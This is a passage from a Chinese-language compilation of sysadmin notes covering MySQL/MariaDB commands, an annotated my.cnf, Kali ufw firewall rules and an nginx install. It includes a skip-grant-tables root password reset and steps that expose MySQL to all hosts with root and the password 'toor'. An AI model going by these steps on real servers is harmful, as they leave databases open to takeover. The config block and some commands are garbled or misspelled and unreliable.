　flush privileges :刷新权限</p>\n<h3 id=\"13、清空表单\"><a href=\"#13、清空表单\" class=\"headerlink\" title=\"13、清空表单\"></a>13、清空表单</h3><p>　　　　delete from t1 :清空表内容</p>\n<h3 id=\"14、删除数据表\"><a href=\"#14、删除数据表\" class=\"headerlink\" title=\"14、删除数据表\"></a>14、删除数据表</h3><p>　　　　drop table t1:删除表</p>\n<h3 id=\"15、删除数据库\"><a href=\"#15、删除数据库\" class=\"headerlink\" title=\"15、删除数据库\"></a>15、删除数据库</h3><p>　　　　drop database zxg：删除zxg数据库</p>\n<h3 id=\"16、查看数据库字符集\"><a href=\"#16、查看数据库字符集\" class=\"headerlink\" title=\"16、查看数据库字符集\"></a>16、查看数据库字符集</h3><p>　　　　show variables like ‘%char%’:查看数据库字符集</p>\n<h3 id=\"17、查看存储引擎\"><a href=\"#17、查看存储引擎\" class=\"headerlink\" title=\"17、查看存储引擎\"></a>17、查看存储引擎</h3><p>　　　　show engines:查看MySQL存储引擎。</p>\n<h3 id=\"18、查看默认存储引擎\"><a href=\"#18、查看默认存储引擎\" class=\"headerlink\" title=\"18、查看默认存储引擎\"></a>18、查看默认存储引擎</h3><p>　　　　show variables like ‘%storage_engine%’:查看MySQL默认的存储引擎</p>\n<h3 id=\"19、修改存储引擎\"><a href=\"#19、修改存储引擎\" class=\"headerlink\" title=\"19、修改存储引擎\"></a>19、修改存储引擎</h3><p>　　　　alter table t1 engine=innodb:修改MySQL t1表存储引擎</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"> 1 [root@web2 ~]# mysql</span><br><span class=\"line\"> 2 Welcome to the MariaDB monitor.  Commands end with ; or \\g.</span><br><span class=\"line\"> 3 Your MariaDB connection id is 2</span><br><span class=\"line\"> 4 Server version: 5.5.60-MariaDB MariaDB Server</span><br><span class=\"line\"> 5 </span><br><span class=\"line\"> 6 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class=\"line\"> 7 </span><br><span class=\"line\"> 8 Type &#x27;help;&#x27; or &#x27;\\h&#x27; for help. Type &#x27;\\c&#x27; to clear the current input statement.</span><br><span class=\"line\"> 9 </span><br><span class=\"line\">10 MariaDB [(none)]&gt; show databases;</span><br><span class=\"line\">11 +--------------------+</span><br><span class=\"line\">12 | Database           |</span><br><span class=\"line\">13 +--------------------+</span><br><span class=\"line\">14 | information_schema |</span><br><span class=\"line\">15 | mysql              |</span><br><span class=\"line\">16 | performance_schema |</span><br><span class=\"line\">17 | test               |</span><br><span class=\"line\">18 +--------------------+</span><br><span class=\"line\">19 4 rows in set (0.00 sec)</span><br><span class=\"line\">20 </span><br><span class=\"line\">21 MariaDB [(none)]&gt;  create database zxg;                   </span><br><span class=\"line\">22 Query OK, 1 row affected (0.00 sec)</span><br><span class=\"line\">23 </span><br><span class=\"line\">24 MariaDB [(none)]&gt; use zxg;</span><br><span class=\"line\">25 Database changed</span><br><span class=\"line\">26 MariaDB [zxg]&gt; show tables;</span><br><span class=\"line\">27 Empty set (0.00 sec)</span><br><span class=\"line\">28 </span><br><span class=\"line\">29 MariaDB [zxg]&gt; create table t1(id varchar(20),name varchar(20));</span><br><span class=\"line\">30 Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\">31 </span><br><span class=\"line\">32 MariaDB [zxg]&gt; show tables;</span><br><span class=\"line\">33 +---------------+</span><br><span class=\"line\">34 | Tables_in_zxg |</span><br><span class=\"line\">35 +---------------+</span><br><span class=\"line\">36 | t1            |</span><br><span class=\"line\">37 +---------------+</span><br><span class=\"line\">38 1 row in set (0.00 sec)</span><br><span class=\"line\">39 </span><br><span class=\"line\">40 MariaDB [zxg]&gt; </span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"> 1 MariaDB [zxg]&gt; insert into t1 values (&quot;1&quot;,&quot;zxg&quot;);</span><br><span class=\"line\"> 2 Query OK, 1 row affected (0.01 sec)</span><br><span class=\"line\"> 3 </span><br><span class=\"line\"> 4 MariaDB [zxg]&gt; select *from t1;</span><br><span class=\"line\"> 5 +------+------+</span><br><span class=\"line\"> 6 | id | name |</span><br><span class=\"line\"> 7 +------+------+</span><br><span class=\"line\"> 8 | 1 | zxg |</span><br><span class=\"line\"> 9 +------+------+</span><br><span class=\"line\">10 1 row in set (0.00 sec)</span><br><span class=\"line\">11 </span><br><span class=\"line\">12 MariaDB [zxg]&gt; select *from t1 where id=1; </span><br><span class=\"line\">13 +------+------+</span><br><span class=\"line\">14 | id | name |</span><br><span class=\"line\">15 +------+------+</span><br><span class=\"line\">16 | 1 | zxg |</span><br><span class=\"line\">17 +------+------+</span><br><span class=\"line\">18 1 row in set (0.00 sec)</span><br><span class=\"line\">19 </span><br><span class=\"line\">20 MariaDB [zxg]&gt; select *from t1 where id=1 and name=&#x27;zxg&#x27;;</span><br><span class=\"line\">21 +------+------+</span><br><span class=\"line\">22 | id | name |</span><br><span class=\"line\">23 +------+------+</span><br><span class=\"line\">24 | 1 | zxg |</span><br><span class=\"line\">25 +------+------+</span><br><span class=\"line\">26 1 row in set (0.01 sec)</span><br><span class=\"line\">27 </span><br><span class=\"line\">28 MariaDB [zxg]&gt; desc t1;</span><br><span class=\"line\">29 +-------+-------------+------+-----+---------+-------+</span><br><span class=\"line\">30 | Field | Type | Null | Key | Default | Extra |</span><br><span class=\"line\">31 +-------+-------------+------+-----+---------+-------+</span><br><span class=\"line\">32 | id | varchar(20) | YES | | NULL | |</span><br><span class=\"line\">33 | name | varchar(20) | YES | | NULL | |</span><br><span class=\"line\">34 +-------+-------------+------+-----+---------+-------+</span><br><span class=\"line\">35 2 rows in set (0.00 sec)</span><br><span class=\"line\">36 </span><br><span class=\"line\">37 MariaDB [zxg]&gt; alter table t1 modify column name varchar(20);</span><br><span class=\"line\">38 Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\">39 Records: 0 Duplicates: 0 Warnings: 0</span><br><span class=\"line\">40 </span><br><span class=\"line\">41 MariaDB [zxg]&gt; update t1 set name=&#x27;zxg.net&#x27; where id=1;</span><br><span class=\"line\">42 Query OK, 1 row affected (0.00 sec)</span><br><span class=\"line\">43 Rows matched: 1 Changed: 1 Warnings: 0</span><br><span class=\"line\">44 </span><br><span class=\"line\">45 MariaDB [zxg]&gt;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、mysql-数据库字符集设置\"><a href=\"#三、mysql-数据库字符集设置\" class=\"headerlink\" title=\"三、mysql 数据库字符集设置\"></a>三、mysql 数据库字符集设置</h2><p> 　mysql数据库存储数据时，默认编码为latinl，存储中文字符时，在调用时会显示为乱码，为了解决该乱码问题，需修改该mysql默认字符集为UTE-8　　</p>\n<p>　　 装mariadb的是时候看已经默认为ute-8</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">MariaDB [(none)]&gt; show variables like &#x27;%char%&#x27;;</span><br><span class=\"line\">+--------------------------+----------------------------+</span><br><span class=\"line\">| Variable_name            | Value                      |</span><br><span class=\"line\">+--------------------------+----------------------------+</span><br><span class=\"line\">| character_set_client     | utf8                       |</span><br><span class=\"line\">| character_set_connection | utf8                       |</span><br><span class=\"line\">| character_set_database   | latin1                     |</span><br><span class=\"line\">| character_set_filesystem | binary                     |</span><br><span class=\"line\">| character_set_results    | utf8                       |</span><br><span class=\"line\">| character_set_server     | latin1                     |</span><br><span class=\"line\">| character_set_system     | utf8                       |</span><br><span class=\"line\">| character_sets_dir       | /usr/share/mysql/charsets/ |</span><br><span class=\"line\">+--------------------------+----------------------------+</span><br><span class=\"line\">8 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p>　　　　如不是，可以设置</p>\n<p>　　　　SET character_set_client = utf8;</p>\n<p>　　　　SET character_set_results = utf8;</p>\n<p>　　　　SET character_set_connection = utf8;</p>\n<h2 id=\"四、mysql-数据库密码管理\"><a href=\"#四、mysql-数据库密码管理\" class=\"headerlink\" title=\"四、mysql 数据库密码管理\"></a>四、mysql 数据库密码管理</h2><p>　　设置密码访问，密码破解、密码权限、修改密码；</p>\n<h3 id=\"1、创建用户及授权\"><a href=\"#1、创建用户及授权\" class=\"headerlink\" title=\"1、创建用户及授权\"></a>1、创建用户及授权</h3><p>　　　　grant all on zxg.* to test@localhost identified by ‘pas’;</p>\n<p>　　　　grant select,insert,update,delete on *.*to test@”%” identified by ‘pas’;</p>\n<p>　　　　grant all on zxg.* to test@<code>192.168.216.53</code> identified by ‘pas’</p>\n<h3 id=\"2、破解密码方法\"><a href=\"#2、破解密码方法\" class=\"headerlink\" title=\"2、破解密码方法\"></a>2、破解密码方法</h3><p>　　　　停止服务—》跳过权限方式启动—》单开一个窗口登陆—》登陆修改密码即可</p>\n<p>　　　　1）systemctl stop mariadb</p>\n<p>　　　　2）mysqld_safe –skip-grant-tables &amp;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@web2 ~]# mysqld_safe --skip-grant-tables &amp;</span><br><span class=\"line\">[1] 47542</span><br><span class=\"line\">[root@web2 ~]# 190520 15:45:22 mysqld_safe Logging to &#x27;/var/log/mariadb/mariadb.log&#x27;.</span><br><span class=\"line\">190520 15:45:22 mysqld_safe Starting mysqld daemon with databases from /var/lib/mysql</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\">[root@web2 ~]# mysql</span><br><span class=\"line\">Welcome to the MariaDB monitor.  Commands end with ; or \\g.</span><br><span class=\"line\">Your MariaDB connection id is 1</span><br><span class=\"line\">Server version: 5.5.60-MariaDB MariaDB Server</span><br><span class=\"line\"></span><br><span class=\"line\">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class=\"line\"></span><br><span class=\"line\">Type &#x27;help;&#x27; or &#x27;\\h&#x27; for help. Type &#x27;\\c&#x27; to clear the current input statement.</span><br><span class=\"line\"></span><br><span class=\"line\">MariaDB [(none)]&gt; use mysql;</span><br><span class=\"line\">Reading table information for completion of table and column names</span><br><span class=\"line\">You can turn off this feature to get a quicker startup with -A</span><br><span class=\"line\"></span><br><span class=\"line\">Database changed</span><br><span class=\"line\">MariaDB [mysql]&gt; update user set password=password(&#x27;11111111&#x27;) where user=&#x27;root&#x27; ;</span><br><span class=\"line\">Query OK, 3 rows affected (0.01 sec)</span><br><span class=\"line\">Rows matched: 4  Changed: 3  Warnings: 0</span><br><span class=\"line\"></span><br><span class=\"line\">MariaDB [mysql]&gt; flush privileges;</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">MariaDB [mysql]&gt; exit</span><br><span class=\"line\">Bye</span><br><span class=\"line\">[root@web2 ~]# </span><br></pre></td></tr></table></figure>\n\n<p>然后退出”跳过权限方式“ ctrl+c ，正常启动mysql就可以了</p>\n<h2 id=\"五、mysql-配置文件详解\"><a href=\"#五、mysql-配置文件详解\" class=\"headerlink\" title=\"五、mysql 配置文件详解\"></a>五、mysql 配置文件详解</h2><h3 id=\"1、参数说明\"><a href=\"#1、参数说明\" class=\"headerlink\" title=\"1、参数说明\"></a>1、参数说明</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[mysqld]                                                              #服务端配置</span><br><span class=\"line\">port        = 3306                                                    #监听端口</span><br><span class=\"line\">socket      = /tmp/mysql.sock                                         #通信设置</span><br><span class=\"line\">user    = mariadb                                                     #使用mariadb用户启动</span><br><span class=\"line\">basedir = /usr/local/mariadb                                          #安装路径</span><br><span class=\"line\">datadir = /data/mysql                                                 #数据目录</span><br><span class=\"line\">log_error = /data/mysql/mariadb.err                             　　　 #错误日志</span><br><span class=\"line\">pid-file = /data/mysql/mariadb.pid                             　　　　#pid进程文件</span><br><span class=\"line\">skip-external-locking                                                 #避免mysql的外部锁定，减少出错几率提高稳定性</span><br><span class=\"line\">key_buffer_size = 64M                                                 #缓存存储引擎参数，这个参数可以设置为64M</span><br><span class=\"line\">max_allowed_packet = 1M                                               #允许最大接收数据包的大小，防止服务器发送过大的数据包，可以设置为16MB或者更大，但设置太大也可能有危险</span><br><span class=\"line\">table_open_cache = 256                                                #mysql每打开一个表，都会读入一些数据到table_open_cache缓存中，当MYSQL在这个缓存中找不到相应的信息时，才会去磁盘读取，默认值64，假设系统有200个并发连接，则需将此参数设置为200*N（N为每个连接所需的文件描述符数目）；当设置为很大时，如果系统处理不了那么多文件描述符，那么就会出现客户端失效，连接不上</span><br><span class=\"line\">sort_buffer_size = 1M                                                 #在表进行order by和group by 排序操作时，由于排序的字段没有索引，会出现Using filesort，为了提高性能，可用此参数增加每个线程分配的缓存区大小，默认时256k，这个参数不要设置过大，一般128~256k，另外一般出现using filesort的时候，要通过增加索引来解决</span><br><span class=\"line\">net_buffer_length = 8K                                                #包消息缓冲区初始化net_buffer_length字节，但需要时可以增长到max_allowed_packet字节</span><br><span class=\"line\">read_buffer_size = 1M                                                 #该参数用于表的顺序扫描，表示每个线程分配的缓冲区大小，比如在进行全表扫描时，mysql会按照数据的存储顺序一次读取数据块，每次读取的数据块首先会暂存在read_buffer_size中，当buffer空间被写满或者全部数据读取结束后，在将buffer中的数据返回给上层调用者，以提高效率默认128k，也不要设置过大</span><br><span class=\"line\">read_rnd_buffer_size = 512K                                           #该参数用于表的随机读取，表示每个线程分配的缓冲区大小，比如，按照一个非索引字段做order by排序操作时，就会利用这个缓冲区来暂存读取的数据，默认时256k，也不要设置过大</span><br><span class=\"line\">myisam_sort_buffer_size = 16M                                         #当myisam表执行repair table或创建索引时，用以缓冲排序索引，设置太小可能会遇到&quot;myisam_sort_buffer_size is to small&quot;</span><br><span class=\"line\">thread_cache_size = 32                                                #线程池，线程缓冲。用来缓冲空闲的线程，以至于不被销毁，如果线程缓冲在的空闲线程，需要重新建立新连接，则会优先调用线程池中的缓冲，很快就能相应连接请求，每建立一个连接，都需要一个线程与之匹配。</span><br><span class=\"line\">query_cache_size = 32M                                                #缓存select语句和结果集大小的参数。查询缓存会存储一个select查询的文本与被传送到客户端的相应结果。如果之后接收到一个相同的查询，服务器会从查询缓存中检索结果，而不是再次分析和执行这个同样的查询。如果你的环境中写操作很少，读操作频繁，那么打开query_cache_type=1，会对性能有明显提升。如果写操作频繁，则应该关闭它（query_cache_type=0）。</span><br><span class=\"line\">tmp_table_size = 64M                                                  #临时HEAP数据表的最大长度(默认设置是32M); 超过这个长度的临时数据表将被转换为MyISAM数据表并存入一个临时文件。</span><br><span class=\"line\">                                                                      #</span><br><span class=\"line\">explicit_defaults_for_timestamp = true                     　　　　　　 #是否显示默认时间戳</span><br><span class=\"line\">#skip-networking                                                      #</span><br><span class=\"line\">max_connections = 500                                                 #该参数用来设置最大连接数，告诉你当前你的服务器允许多少并发连接。默认为100，一般设置为512-1000即可。请记住，太多的连接会导致内存的使用量过高并且会锁住你的 MySQL 服务器。一般小网站需要 100-200 的连接数，而较大可能需要 500-800 甚至更多。这里的值很大程度上取决于你 MySQL/MariaDB 的使用情况。</span><br><span class=\"line\">max_connect_errors = 100                                              #如果有时网络抽风，或者应用配置错误，或者其他原因导致客户端短时间内不断的尝试连接，客户端可能会被列入黑名单，然后将无法连接，直到再次刷新主机缓存。这个选项默认值太小了，可以考虑设的足够大（如果你的服务器配置够强大的话）。</span><br><span class=\"line\">open_files_limit = 65535                                              #mysql打开最大文件数</span><br><span class=\"line\">                                                                      #</span><br><span class=\"line\">log-bin=mysql-bin                                                     #这些路径相对于datadir</span><br><span class=\"line\">binlog_format=mixed                                                   #日志格式</span><br><span class=\"line\">server-id   = 1                                                       #给服务器分配一个独一无二的ID编号; n的取值范围是1~2的32次方启用二进制日志功能。在复制数据同步的时候会用到，Helloweba后面会有文章介绍。</span><br><span class=\"line\">expire_logs_days = 10                                                 #启用二进制日志后，保留日志的天数。服务器会自动清理指定天数前的日志文件，如果不设置则会导致服务器空间耗尽。一般设置为7～14天。</span><br><span class=\"line\">                                                                       #</span><br><span class=\"line\">default_storage_engine = InnoDB                                     　#新数据表的默认存储引擎(默认设置是MyISAM)。这项设置还可以通过–default-table-type选项来设置。</span><br><span class=\"line\">innodb_file_per_table = 1                                             #提供了更灵活的方式，它把每个数据库的信息保存在一个 .ibd 数据文件中。每个 .idb 文件代表它自己的表空间。通过这样的方式可以更快地完成类似 “TRUNCATE” 的数据库操作，当删除或截断一个数据库表时，你也可以回收未使用的空间。这样配置的另一个好处是你可以将某些数据库表放在一个单独的存储设备。这可以大大提升你磁盘的 I/O 负载。</span><br><span class=\"line\">innodb_data_home_dir = /data/mysql                             　　　　#InnoDB主目录，所有与InnoDB数据表有关的目录或文件路径都相对于这个路径。在默认的情况下，这个主目录就是MySQL的数据目录。</span><br><span class=\"line\">innodb_data_file_path = ibdata1:10M:autoextend     　　　　　　　　　　　#用来容纳InnoDB为数据表的表空间: 可能涉及一个以上的文件; 每一个表空间文件的最大长度都必须以字节(B)、兆字节(MB)或千兆字节(GB)为单位给出; 表空间文件的名字必须以分号隔开; 最后一个表空间文件还可以带一个autoextend属性和一个最大长度(max:n)。</span><br><span class=\"line\">innodb_log_group_home_dir = /data/mysql                     　　　　　　#用来存放InnoDB日志文件的目录路径(如ib_logfile0、ib_logfile1等)。在默认的情况下，InnoDB驱动程序将使用 MySQL数据目录作为自己保存日志文件的位置。</span><br><span class=\"line\">innodb_buffer_pool_size = 256M                                     　　#这个参数是InnoDB存储引擎的核心参数，默认为128KB，这个参数要设置为物理内存的60%～70%。</span><br><span class=\"line\">innodb_log_file_size = 64M                                            #事务日志文件写操作缓存区的最大长度(默认设置是1MB)。</span><br><span class=\"line\">innodb_log_buffer_size = 8M                                           #事务日志所使用的缓存区。InnoDB在写事务日志的时候，为了提高性能，先将信息写入Innodb Log Buffer中，当满足innodb_flush_log_trx_commit参数所设置的相应条件（或者日志缓冲区写满）时，再将日志写到文件（或者同步到磁盘）中。可以通过innodb_log_buffer_size参数设置其可以使用的最大内存空间。默认是8MB，一般为16～64MB即可。</span><br><span class=\"line\">innodb_flush_log_at_trx_commit = 1                             　　　　#这个选项决定着什么时候把日志信息写入日志文件以及什么时候把这些文件物理地写(术语称为”同步”)到硬盘上。设置值0的意思是每隔一秒写一次日 志并进行 同步，这可以减少硬盘写操作次数，但可能造成数据丢失; 设置值1(设置设置)的意思是在每执行完一条COMMIT命令就写一次日志并进行同步，这可以防止数据丢失，但硬盘写操作可能会很频繁; 设置值2是一般折衷的办法，即每执行完一条COMMIT命令写一次日志，每隔一秒进行一次同步。</span><br><span class=\"line\">innodb_lock_wait_timeout = 50                                         #如果某个事务在等待n秒(s)后还没有获得所需要的资源，就使用ROLLBACK命令放弃这个事务。这项设置对于发现和处理未能被InnoDB数据表驱动 程序识别出来的死锁条件有着重要的意义。这个选项的默认设置是50s。</span><br><span class=\"line\">                                                                      #</span><br><span class=\"line\">[mysqldump]                                                           #</span><br><span class=\"line\">quick                                                                 #</span><br><span class=\"line\">max_allowed_packet = 16M                                              #            </span><br><span class=\"line\">                                                                      #</span><br><span class=\"line\">[mysql]                                                               #</span><br><span class=\"line\">no-auto-rehash                                                        #</span><br><span class=\"line\">                                                                      #</span><br><span class=\"line\">[myisamchk]                                                           #</span><br><span class=\"line\">key_buffer_size = 64M                                                 #    </span><br><span class=\"line\">sort_buffer_size = 1M                                                 #    </span><br><span class=\"line\">read_buffer = 2M                                                      #</span><br><span class=\"line\">write_buffer = 2M                                                     #</span><br><span class=\"line\">                                                                      #</span><br><span class=\"line\">[mysqlhotcopy]                                                        #</span><br><span class=\"line\">interactive-timeout                                                   #</span><br><span class=\"line\">                                                </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2、mysql数据库索引案例（百万量级）\"><a href=\"#2、mysql数据库索引案例（百万量级）\" class=\"headerlink\" title=\"2、mysql数据库索引案例（百万量级）\"></a>2、mysql数据库索引案例（百万量级）</h3><p> [client]                     </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">port    =3306                                    </span><br><span class=\"line\">socket    =/tmp/mysql.sock                       </span><br><span class=\"line\">                                                </span><br><span class=\"line\">[mysqld]                                                                               </span><br><span class=\"line\">port        = 3306                                                           </span><br><span class=\"line\">socket      = /tmp/mysql.sock                                     </span><br><span class=\"line\">user    = mysql    server_id　　= 10datadir　　= /data/mysql/old_passwords　　= 1lower_case_table_names　　= 1character-set-server　　= utf8default-storage-engine　　= MYISAMlog-bin　　= bin.loglog-error　　= error.logpid-file　　= mysql.pidlong_query_time　　= 2slow_query_time　　= 2slow_query_log　slow_query_log_file　　= slow.logbinlog_cache_size　　= 4MBbinlog_format　　= mixedmax_binlog_cache_size　　= 16MBmax_binlog_size　　= 1GBexpire_logs_days　　= 30ft_min_word_len　　= 4back_log　　= 512max_allowed_packet　　= 64MBmax_connections　　= 4096max_connect_errors　　= 100join_buffer_size　　= 2MBread_buffer_size　　= 2MBread_rnd_buffer_size　　= 2MBsort_buffer_size　　　　= 2MBquery_cache_size　　= 2MBtable_open_cache　　= 10000thread_cache_size　　= 256max_heap_table_size　　= 64MBtmp_table_size　　= 64MBthread_stack　　= 192KBthread_concurrency　　= 24 local-infile　　= 0skip-show-databaseskip-name-resolveskip-external-lockingconnect_timeout　　= 600interactive_timeout　　= 600wait_timeout　　= 600#MyISAMkey_buffer_size　　= 512MBbulk_insert_buffer_size　　= 64MBmysiam_sort_buffer_size　　= 64MBmysiam_max_sort_file_size　　= 1GBmysiam_repair_threads　　= 1concurrent_insert　　= 2myisam_recover#INNODBinnodb_buffer_pool_size　　= 64Ginnodb_additional_mem_pool_size　　= 32MBinnodb_data_file_path　　=　ibdata1:1G;ibdata2:1G:autoextendinnodb_read_io_threads　　= 8innodb_write_io_threads 　　= 8innodb_file_per_table　　= 1innodb_flush_log_at_thx_commit　　= 2innodb_lock_wait_timeout　　= 120innodb_log_buffer_size　　= 8MBinnodb_log_file_size　　= 256MBinnodb_log_files_in_group　　= 3innodb_max_dirty_pages_pct　　= 90innodb_thread_concurrency　　= 16innodb_open_files　　= 10000#innodb_force_recovery　　= 4#replication slaveread-only#skip-salve-startrelay-log　　= relay.loglog-slave-updates</span><br></pre></td></tr></table></figure>\n\n<p>本文参考：</p>\n<p><a href=\"https://www.centos.bz/2018/02/mariadb-mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6my-cnf%E8%A7%A3%E8%AF%BB/\">https://www.centos.bz/2018/02/mariadb-mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6my-cnf%E8%A7%A3%E8%AF%BB/</a></p>\n<h1 id=\"kali开启端口、关闭防火墙方法\"><a href=\"#kali开启端口、关闭防火墙方法\" class=\"headerlink\" title=\"kali开启端口、关闭防火墙方法\"></a>kali开启端口、关闭防火墙方法</h1><p>发布时间：2020年02月28日 阅读：13178 次</p>\n<p>先安装ufw命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt-get install ufw</span><br></pre></td></tr></table></figure>\n\n<p>ufw命令用法</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">检查防火墙的状态（默认 inactive） <span class=\"comment\"># ufw status\t\t\t防火墙版本  ufw version</span></span><br><span class=\"line\">启动ufw防火墙 <span class=\"comment\"># ufw enable\t\t\t\t\t\t\t关闭ufw防火墙 # ufw disable</span></span><br><span class=\"line\">默认禁止访问所有 <span class=\"comment\"># ufw default deny\t\t\t\t\t   开放22/TCP端口 # ufw allow 22/tcp</span></span><br><span class=\"line\">开放53端口(tcp/udp) <span class=\"comment\"># ufw allow 53\t\t\t\t\t  禁止外部访问 # ufw deny 3306</span></span><br><span class=\"line\">删除已经添加过的规则 <span class=\"comment\"># ufw delete allow 22\t\t\t  允许此IP访问所有的本机端口 # ufw allow from 192.168.1.100\t\t\t\t\t\t</span></span><br><span class=\"line\">删除上面的规则 <span class=\"comment\"># ufw delete allow from 192.168.1.100</span></span><br><span class=\"line\">查看规则，显示行号 <span class=\"comment\"># ufw status numbered\t\t\t\t   删除第三条规则 # ufw delete 3</span></span><br><span class=\"line\">关闭ufw <span class=\"comment\"># ufw disable\t\t\t\t\t\t\t\t   禁止对8888端口的访问 # ufw deny 8888</span></span><br><span class=\"line\">打开来自192.168.0.1的tcp请求的22端口 <span class=\"comment\"># ufw allow proto tcp from 192.168.0.1 to any port 22</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"kali-linux如何打开mysql-Navicat联接kali-Linux中的mysql\"><a href=\"#kali-linux如何打开mysql-Navicat联接kali-Linux中的mysql\" class=\"headerlink\" title=\"kali linux如何打开mysql,Navicat联接kali Linux中的mysql\"></a>kali linux如何打开mysql,Navicat联接kali Linux中的mysql</h1><p><img src=\"https://csdnimg.cn/release/blogv2/dist/pc/img/reprint.png\" alt=\"img\"></p>\n<p><a href=\"https://blog.csdn.net/weixin_29838739\">Xenophon Tony</a><img src=\"https://csdnimg.cn/release/blogv2/dist/pc/img/newCurrentTime2.png\" alt=\"img\">于 2021-05-07 00:25:32 发布<img src=\"https://csdnimg.cn/release/blogv2/dist/pc/img/articleReadEyes2.png\" alt=\"img\">579</p>\n<p>文章标签： <a href=\"https://so.csdn.net/so/search/s.do?q=kali+linux%E5%A6%82%E4%BD%95%E6%89%93%E5%BC%80mysql&t=blog&o=vip&s=&l=&f=&viparticle=\">kali linux如何打开mysql</a></p>\n<p><a href=\"https://so.csdn.net/so/search?q=Navicat&spm=1001.2101.3001.7020\">Navicat</a>联接kali Linux中的mysql</p>\n<p>一. 在<a href=\"https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020\">kali</a>中默认已安装mysql</p>\n<p>service mysql start 开启mysql服务</p>\n<p>ps aux|<a href=\"https://so.csdn.net/so/search?q=grep&spm=1001.2101.3001.7020\">grep</a> mysql 查看是否开启mysql服务</p>\n<p>service mysql stop 关闭服务</p>\n<p>service mysql status查看服务的当前状态也</p>\n<p>service mysql restart 重新开启服务</p>\n<p>注释：如果没有安装，可以使用sudo apt-get install mysql-server</p>\n<p>二，配置mysql</p>\n<p>vim /etc/mysql/mysql/mysql.conf.d/mysql.cnf</p>\n<p>将bind-address = 127.0.0.0 修改为 0.0.0.0</p>\n<p>三，修改mysql的用户</p>\n<p>在kali中mysql的默认账号为</p>\n<p>账户：root 密码为无</p>\n<p>直接输入 mysql 可以进入</p>\n<p>如果需要修改密码 ：</p>\n<p>1，mysql</p>\n<p>2，show databases; 查看数据库中所有的数据库</p>\n<p>3，use mysql； 使用mysql数据库</p>\n<p>4，show tables; 查看叫mysql的数据库中所有的表</p>\n<p>5，update user set password=password(‘toor’) where user=’root’; 设置密码</p>\n<p>6，flush privileges;刷新</p>\n<p>四，修改mysql的权限，可以让其他主机访问到</p>\n<p>在mysql命令行中输入：</p>\n<p>GREANT ALL PRIVILEGES ON . TO ‘root(用户名)’ IDENTIFIED BY ‘toor(密码)’ WITH GRANT OPTION;</p>\n<p>flush privileges;</p>\n<p>五，下载安装Navicat</p>\n<p><a href=\"http://http//download.csdn.net/detail/muier/9189743\">http://http://download.csdn.net/detail/muier/9189743</a></p>\n<p>输入ip地址，账号密码，点击连接测试，成功后，点击确定进入数据库。</p>\n<h1 id=\"kali-安装nginx服务器\"><a href=\"#kali-安装nginx服务器\" class=\"headerlink\" title=\"kali 安装nginx服务器\"></a>kali 安装nginx服务器</h1><p><a href=\"https://www.zhihu.com/people/barrypro\"><img src=\"https://pic3.zhimg.com/v2-a2875c81b552fc2dd2119c8f1e9c850e_xs.jpg?source=172ae18b\" alt=\"BarryPro\"></a></p>\n<p><a href=\"https://www.zhihu.com/people/barrypro\">BarryPro</a><a href=\"https://www.zhihu.com/question/48510028\"></a></p>\n<h3 id=\"1-去官网下载最新版的安装包，以nginx-1-16-1为例\"><a href=\"#1-去官网下载最新版的安装包，以nginx-1-16-1为例\" class=\"headerlink\" title=\"1.去官网下载最新版的安装包，以nginx-1.16.1为例\"></a>1.去官网下载最新版的安装包，以nginx-1.16.1为例</h3><figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://nginx.org/download/nginx-1.16.1.tar.gz</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-解压tar-gz-文件到指定路径\"><a href=\"#2-解压tar-gz-文件到指定路径\" class=\"headerlink\" title=\"2.解压tar.gz 文件到指定路径\"></a>2.解压tar.gz 文件到指定路径</h3><figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">tar -xvf nginx-1.16.1.tar.gz -C /home/root/moudle/</span><br><span class=\"line\">cd /home/root/moudle/</span><br><span class=\"line\"># 这个路径是源码路径</span><br><span class=\"line\">cd nginx-1.16.1</span><br><span class=\"line\"># --prefix 后面指定的是编译后的nginx软件的安装路径，这一步可能会报错，如果报错就按照第3步来</span><br><span class=\"line\">./configure --prefix=/home/root/nginx</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-缺少pcre包解决\"><a href=\"#3-缺少pcre包解决\" class=\"headerlink\" title=\"3.缺少pcre包解决\"></a>3.缺少pcre包解决</h3><h3 id=\"3-1报错详情\"><a href=\"#3-1报错详情\" class=\"headerlink\" title=\"3.1报错详情\"></a>3.1报错详情</h3><figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">./configure: error: the HTTP rewrite module requires the PCRE library. You can either disable the module by using </span><br><span class=\"line\">--without-http_rewrite_module option, or install the PCRE library into the system, or build the PCRE library statically</span><br><span class=\"line\">from the source with nginx by using --with-pcre= option. </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-2解决方法\"><a href=\"#3-2解决方法\" class=\"headerlink\" 